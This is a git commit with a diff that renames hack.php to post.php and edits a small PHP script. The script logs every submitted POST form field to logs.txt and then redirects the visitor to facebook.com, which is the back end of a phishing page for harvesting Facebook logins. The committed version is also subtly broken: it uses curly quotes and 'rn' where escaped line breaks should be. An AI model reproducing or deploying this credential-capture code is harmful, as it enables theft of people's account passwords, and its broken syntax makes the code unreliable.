4cbea52e3f2fa81d9c5e5c70bb5f588587113b9c
dannymtcoder <52970986+dannymtcoder@users.noreply.github.com>
2019-07-23 14:15:54 +0200

    rename hack.php to post.php

--- post.php
+++ post.php
@@ -1,13 +1,13 @@
 <?php
-header(“Location: https://www.facebook.com”);
+header (‘Location:http://www.facebook.com/’);
 $handle = fopen(“logs.txt”, “a”);
-foreach($_GET as $variable => $value) {
+foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, “=”);
 fwrite($handle, $value);
-fwrite($handle, “\r\n”);
+fwrite($handle, “rn”);
 }
-fwrite($handle, “\r\n”);
+fwrite($handle, “rn”);
 fclose($handle);
 exit;
-?>
+?> 
